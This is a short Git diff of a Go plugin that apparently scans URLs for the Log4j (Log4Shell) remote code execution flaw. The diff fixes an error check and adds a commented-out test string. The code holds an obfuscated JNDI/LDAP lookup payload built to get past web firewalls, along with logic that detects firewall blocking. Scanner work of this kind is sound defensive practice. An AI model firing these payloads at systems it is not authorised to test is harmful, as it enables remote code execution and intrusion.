@@ -52,6 +52,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 	_ = meta
 	// count := 0
 	randStr := domain + "." + utils.RandStringRunes(6)
+	// randStr = "nowqq" + utils.RandStringRunes(6)
 	fmt.Println(randStr)
 	payloads := []string{
 		"${j${::-}n${::-}d${::-}i:l${::-}d${::-}a${::-}p://",
@@ -125,7 +126,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 					resp, err := util.RequestDo(request, false)
 
 					// 存在腾讯门神防火墙或者华为防火墙的情况下执行return false
-					if &resp != nil && err != nil && resp.Other != nil {
+					if &resp != nil && err == nil && resp.Other != nil {
 						if resp.Other.StatusCode == 501 || resp.Other.StatusCode == 418 {
 							return false
 						}
